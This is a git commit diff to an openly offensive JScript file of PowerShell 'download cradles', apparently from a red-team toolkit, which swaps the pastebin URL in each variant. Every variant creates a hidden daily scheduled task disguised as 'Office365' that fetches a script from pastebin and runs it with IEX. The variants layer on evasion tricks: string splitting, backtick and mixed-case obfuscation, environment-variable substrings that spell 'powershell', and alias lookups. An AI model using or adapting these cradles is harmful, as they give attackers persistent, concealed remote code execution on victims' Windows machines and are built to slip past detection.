e4e02bccfb5297fd4c97f440f9022feef772a7ba
VirtualAllocEx <50073731+VirtualAlllocEx@users.noreply.github.com>
2022-07-07 09:26:26 +0200

    Update Taskschedule_Download_Cradles.js

--- Taskschedule_Download_Cradles.js
+++ Taskschedule_Download_Cradles.js
@@ -1,20 +1,20 @@
 #Info: This .js scripts can be used, to create a taskschedule persistence with a not proxy aware PowerShell Download Cradle
 #Info: To escape \" in .js \\\\\\"
 c=new ActiveXObject("W"+"S"+"cr"+"ip"+"t."+"S"+"h"+"e"+"l"+"l");
-c.run('cmd.exe /c SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR "pOwErsHelL -w hidDEn -nOpR  -coM \'I`eX (N`E`W`-obje`CT Net.Webclient).\\\\\\"dowNloa`DST`RIng\\\\\\"((\\\\\\"https://pastebin.com/raw/Qpiz8y6c\\\\\\"))"', 0);
+c.run('cmd.exe /c SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR "pOwErsHelL -w hidDEn -nOpR  -coM \'I`eX (N`E`W`-obje`CT Net.Webclient).\\\\\\"dowNloa`DST`RIng\\\\\\"((\\\\\\"https://pastebin.com/raw/88SGrHVh\\\\\\"))"', 0);
 
 
 #Info: This .js scripts can be used, to create a taskschedule persistence with a not proxy aware PowerShell Download Cradle
 #Info: %APPDATA:~-13,1%%ALLUSERSPROFILE:~-9,-8%%OS:~-5,1%er%TMP:~7,1%he%TEMP:~-10,1%l = powershell.exe
 c=new ActiveXObject("W"+"S"+"cr"+"ip"+"t."+"S"+"h"+"e"+"l"+"l");
-c.run('cmd.exe /c SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR "%APPDATA:~-13,1%%ALLUSERSPROFILE:~-9,-8%%OS:~-5,1%er%TMP:~7,1%he%TEMP:~-10,1%l -w hidDEn -nOpR  -coM \'I`eX (N`E`W`-obje`CT Net.Webclient).\\\\\\"dowNloa`DST`RIng\\\\\\"((\\\\\\"https://pastebin.com/raw/Qpiz8y6c\\\\\\"))"', 0);
+c.run('cmd.exe /c SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR "%APPDATA:~-13,1%%ALLUSERSPROFILE:~-9,-8%%OS:~-5,1%er%TMP:~7,1%he%TEMP:~-10,1%l -w hidDEn -nOpR  -coM \'I`eX (N`E`W`-obje`CT Net.Webclient).\\\\\\"dowNloa`DST`RIng\\\\\\"((\\\\\\"https://pastebin.com/raw/88SGrHVh\\\\\\"))"', 0);
 
 
 #Info: This .js scripts can be used, to create a taskschedule persistence with a not proxy aware PowerShell Download Cradle
 #Info: %APPDATA:~-13,1%%ALLUSERSPROFILE:~-9,-8%%OS:~-5,1%er%TMP:~7,1%he%TEMP:~-10,1%l = powershell.exe
 #Info: &(GAL IE*) = Alias IEX
 c=new ActiveXObject("W"+"S"+"cr"+"ip"+"t."+"S"+"h"+"e"+"l"+"l");
-c.run('cmd.exe /c SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR "%APPDATA:~-13,1%%ALLUSERSPROFILE:~-9,-8%%OS:~-5,1%er%TMP:~7,1%he%TEMP:~-10,1%l -w hidDEn -nOpR  -coM &(GAL IE*) ((N`E`W`-obje`CT Net.Webclient).\\\\\\"dowNloa`DST`RIng\\\\\\"((\\\\\\"https://pastebin.com/raw/Qpiz8y6c\\\\\\")))"', 0);
+c.run('cmd.exe /c SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR "%APPDATA:~-13,1%%ALLUSERSPROFILE:~-9,-8%%OS:~-5,1%er%TMP:~7,1%he%TEMP:~-10,1%l -w hidDEn -nOpR  -coM &(GAL IE*) ((N`E`W`-obje`CT Net.Webclient).\\\\\\"dowNloa`DST`RIng\\\\\\"((\\\\\\"https://pastebin.com/raw/88SGrHVh\\\\\\")))"', 0);
 
 
 #Info: This .js scripts can be used, to create a taskschedule persistence with a not proxy aware PowerShell Download Cradle
@@ -22,14 +22,14 @@ c.run('cmd.exe /c SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR "%APPDA
 #Info: &(GAL IE*) = Alias IEX
 #Info: .(Get-Command N*ct) = New-Object
 c=new ActiveXObject("W"+"S"+"cr"+"ip"+"t."+"S"+"h"+"e"+"l"+"l");
-c.run('cmd.exe /c SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR "%APPDATA:~-13,1%%ALLUSERSPROFILE:~-9,-8%%OS:~-5,1%er%TMP:~7,1%he%TEMP:~-10,1%l -w hidDEn -nOpR  -coM &(GAL IE*) ((.(Get-Command N*ct) Net.Webclient).\\\\\\"dowNloa`DST`RIng\\\\\\"((\\\\\\"https://pastebin.com/raw/Qpiz8y6c\\\\\\")))"', 0);
+c.run('cmd.exe /c SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR "%APPDATA:~-13,1%%ALLUSERSPROFILE:~-9,-8%%OS:~-5,1%er%TMP:~7,1%he%TEMP:~-10,1%l -w hidDEn -nOpR  -coM &(GAL IE*) ((.(Get-Command N*ct) Net.Webclient).\\\\\\"dowNloa`DST`RIng\\\\\\"((\\\\\\"https://pastebin.com/raw/88SGrHVh\\\\\\")))"', 0);
 
 
 
 #Info: This .js script can be used, to create a taskschedule persistence with a proxy aware PowerShell Download Cradle
 #Info: To escape \" in .js \\\\\\"
 c=new ActiveXObject("W"+"S"+"cr"+"ip"+"t."+"S"+"h"+"e"+"l"+"l");
-c.run('cmd.exe /c SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR "PoWeRsHelL.eXe -NoP -w HidDen -c $a=neW-ObJeCt nET.wEbClieNt;$a.pROxy=[NeT.WeBreQueSt]::geTsyStEmweBprOxy();$a.prOxY.crEdEnTials=[NEt.crEdEnTiaLcaChe]::deFaUltcrEdeNtials;IeX $a.DOwNLOadstRiNg(\\\\\\"ht\\\\\\"+\\\\\\"tps://pastebin.com/raw/Qpiz8y6c\\\\\\")"', 0);
+c.run('cmd.exe /c SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR "PoWeRsHelL.eXe -NoP -w HidDen -c $a=neW-ObJeCt nET.wEbClieNt;$a.pROxy=[NeT.WeBreQueSt]::geTsyStEmweBprOxy();$a.prOxY.crEdEnTials=[NEt.crEdEnTiaLcaChe]::deFaUltcrEdeNtials;IeX $a.DOwNLOadstRiNg(\\\\\\"ht\\\\\\"+\\\\\\"tps://pastebin.com/raw/88SGrHVh\\\\\\")"', 0);
 
 
 #Info: This .js script can be used, to create a taskschedule persistence with a proxy aware PowerShell Download Cradle
